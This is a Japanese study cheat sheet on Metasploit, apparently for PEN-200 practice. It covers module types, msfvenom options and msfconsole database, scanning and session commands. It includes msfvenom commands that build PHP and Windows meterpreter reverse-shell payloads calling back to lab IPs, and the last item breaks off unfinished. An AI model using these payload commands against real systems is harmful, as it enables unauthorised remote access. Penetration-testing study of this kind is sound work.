# Metasploit
[公式ドキュメント](https://docs.metasploit.com)

## 概要
Exploitにつかえるツールがたくさん入ってるOSSのツール。Gitで開発に参加もできる。

Metasploitには以下4つのモジュールがある。攻撃するためのタイプではない。データ収集などができる。
- **Auxiliary** => 
- **Exploit** => ターゲットに侵入するためのExploitを実行できる。
- **Payloads** => RCE実行時のペイロード。ユーザ作成やシェルをつないだりといったことができる。
- **Post** => 初期侵入後にセッションからデータを収集・列挙する系のタスク

## Cheat Sheet
Metasploitを起動する。
```
msfconsole
```

## Msfvenom
[Msfvenomのドキュメント](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)

### CheatSheet

-p => カスタムペイロードを使う
-p --payload-options => ペイロードのオプションを表示
-e => エンコードを表示
-a => バイナリが実行されるアーキテクチャを選択
-b => バイナリに使わないバイナリ文字列を選択する。"\x80"とかをいれてNULL文字を含まないようにしたりとか。
-f => アウトプットのフォーマットを選択する。-f cにするとC言語のバイナリ文字列で出せたりする。
--list formats => formatオプションの使用できるオプション一覧を表示する。他のオプションもlist表示できる。

### コマンド集
phpのリバースシェルを生成する
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.45.157 LPORT=4444 -f raw > shell.php
```

1. windows用のリバースシェルバイナリを生成する。
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.5 LPORT=443 -f exe -o met.exe
```

2. Metasploitフレームワークに搭載されているDBサービスを開始する。Metasploitの実行において必須ではないが、ターゲットホストに関する情報の保存等で使える。  
MSFはDBとしてPostgreSQLを使う。
```
sudo msfdb init
```

#### msfconsole

1. msfconsoleによってMetasploitのCLIを起動する。
```
sudo msfconsole
```

2. 使用可能なすべてのコマンドのリストを取得する。
```
help
```

3. 以前に作成したすべてのワークスペースを一覧で表示する。(pythonでいうvenvの仮想環境みたいなもの？)
```
workspace
```

4. 新しくworkspaceを作成する。
```
workspace -a pen200
```

5. msfconsoleのセッション内でnmapをターゲットに対して実行し、その結果を現在のworkspaceで保存する。  
nmapのコマンドは通常と同じ。
```
db_nmap -A 192.168.50.202
```

6. msfconsoleのセッションにて、dbとの接続をチェックする。
```
db_status
```

7. これまでに検出されたすべてのホストのリスをと取得する。これも、msfconsoleのセッションにてdbを立ち上げているからできる。
```
hosts
```

8. ポートスキャンで検出されたサービスを表示する。
```
services
```

9. smb用のサポートモジュールを検索する
```
search type:auxiliary smb
```

10. use しているエクスプロイトモジュールで設定可能なパラメータを表示する。
```
show options
```

11. パラメータの値を設定する。ここでは、RHOSTSにIPをセット。
```
set RHOSTS 127.0.0.1
```

12. 一度設定したパラメータを初期化する。
```
unset RHOSTS
```

13. 既に検索したhostsに対してスキャンをかけ、445が空いているホストを表示し、それをRHOSTSにセットする。
```
services -p 445 --rhosts
```

14. setしているエクスプロイトを実行する
```
run
```

15. スキャンしたターゲットにおいて、既知の脆弱性が存在するかをチェックする。
```
vulns
```

16. これまでに収集したすべての有効な認証情報を表示する。
```
creds
```

17. エクスプロイトをセットした後に、そのエクスプロイトが何をするものなのか、一般的な情報を取得する。  
ここで、**Module reliability:**という項目があり、エクスプロイトによってはrepeatableなものと**1度しか使用できないもの**があるので注意が必要。  
さらに、**check support**の項目がYesになっている場合、**check**コマンドで、実際にエクスプロイトを走らせる前に、ターゲットに対してエクスプロイトが正しく動作するかをチェックすることもできる。
```
info
```

18. シェルを取った後に、Ctrl+Zでセッションをバックグラウンドにする。その後、msfconsole内でsessions -lを実行してsessionIdを特定。  
session -i 2のようにしてsessionIdを指定して再度セッションに戻る。

19. 現在useしているエクスプロイトで使えるpayloadを一覧表示する。 ファイル名に/がついているとステージングのペイロード。  
非ステージングpayloadの方がNWトラフィックが発生しづらい。つまり_の方のファイル。
```
